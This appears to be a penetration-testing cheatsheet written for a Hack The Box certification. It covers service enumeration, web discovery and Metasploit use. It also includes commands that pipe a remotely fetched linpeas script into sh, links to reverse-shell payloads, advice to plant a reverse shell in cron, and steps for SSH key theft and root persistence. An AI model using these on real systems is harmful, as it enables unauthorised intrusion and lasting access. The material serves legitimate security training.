# HTBCert
Cheatsheet for the Hack The Box certification

# Useful Commands
Python Web Server `sudo python3 -m http.server 80`

# Service Scanning
## Nmap
- All purpose nmap command `nmap -sV -sC -p- IP`

## Banner Grabbing
- Identify service by grabbing its banner `nc -nv IP PORT` 
- Automated using nmap `nmap -sV --script=banner -pPORT IP/RANGE.`

## FTP
- Connect to an FTP `ftp -p IP` 
- Available commands: `cd` `ls` `get FILE`

## SMB
- Enumerating SMB with nmap `nmap --script smb-os-discovery.nse -p445 IP` 
- Enumerate and interact with SMB shares `smbclient -N -L \\\\IP`
- If shares are revealed (For instance users) `smbclient \\\\IP\\users`
- Connecting using a specific user `smbclient -U USER \\\\IP\\users`
- - Available commands: `cd` `ls` `get FILE`

## SNMP
If version < v3 then it's not encrypted. (Other versions are 1 and 2c)
- `snmpwalk -v 2c -c public IP 1.3.6.1.2.1.1.5.0` (Last bit is the community string, find it online with device name)
- `snmpwalk -v 2c -c private  IP`
- Brute force community string using onesixtyone `onesixtyone -c dict.txt IP` dict.txt is the on included on the [Github](https://github.com/trailofbits/onesixtyone) of the tool.

# Web Enumeration
## Gobuster
### Directory/File Enumeration
- Directory (and file) brute-forcing `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` (200, 403 or 301 are a success!)

### DNS Subdomain Enumeration
- `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`

## Banner Grabbing / Web Server Headers
- `curl -IL https://www.inlanefreight.com`
- [ ] Install https://github.com/FortyNorthSecurity/EyeWitness on VM

## Whatweb
 - Version of web servers, supporting frameworks, and applications `whatweb IP` (Can be automated by using a range (/24) and `--no-errors`)
 
 ## Certificate
 - View the certificate by visiting the application in a web browser, can contain usefull information for a phishing attack.

## Robots.txt
It is common for websites to contain a robots.txt file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. The robots.txt file can provide valuable information such as the location of private files and admin pages.

## Source Code
It is worth checking the source code for any web pages we come across. We can hit `[CTRL + U]` to bring up the source code window in a browser.

# Metasploit
- Step 1 `msfconsole`
- Step 2 `search exploit NAME`
- Step 3 `use FULL_NAME` you get full name from the search.
- Step 4 `show options`
- Step 5 `set OPTION_NAME VALUE`, example `set RHOSTS 10.10.10.40` or `set LHOST tun0`
- Step 6 `check`
- Step 7 `run` or `exploit`

## Search for exploit
- `searchsploit APPLICATION Version` searchsploit openssh 7.2

# Netcat Reverse Shell Listener
`nc -lnvp PORT`

# Reverse Shell Commands
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

# Bind Shell Commands
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md

# Upgrade Shell
Python example `python -c 'import pty; pty.spawn("/bin/bash")'`

# Privilege Escalation
https://book.hacktricks.xyz/
`linpeas.sh` exist for Windows as Winpeas
`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` requires internet access on target
if not spin up python server and use that command `curl HOST_IP/linpeas.sh | sh`

## Vulnerable software
Use `dpkg -l` on Linux or look in C:\Program Files on Windows to see what software is installed. They can be outdated and/or vulnerable to publicly available exploits.

## Check User Privileges
check what sudo privileges your user has `sudo -l`
For example if we see that user has access to the echo command without needing a password:
`(user : user) NOPASSWD: /bin/echo` we can then use the command like this: 
`sudo -u user /bin/echo Hello World!` Which prints Hello World!
https://gtfobins.github.io/ Contains a list of commands and how they can be exploited through sudo.
https://lolbas-project.github.io/# Same for Windows.

# Scheduled Tasks
It exists specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them:
- `/etc/crontab`
- `/etc/cron.d`
- `/var/spool/cron/crontabs/root`
Create a cron job that executes a bash script containg a reverse shell command.

# SSH Keys
If we can read /home/user/.ssh/id_rsa or /root/.ssh/id_rsa we can copy it to our host and connect through ssh to the target:
`ssh user@10.10.10.10 -i id_rsa` for example.

If we already have access as a user and have write write to .ssh and want a more permanent way to access target we can generate a new key using `Xantra@htb[/htb]$ ssh-keygen -f key` 
the `key` file will be used to ssh to the target and `key.pub` will be written to the authprozed_keys file of the target.
`user@remotehost$ echo "ssh-rsa AAAAB...SNIP..." >> /root/.ssh/authorized_keys`

We can now SSH like so: `Xantra@htb[/htb]$ ssh root@10.10.10.10 -i key`
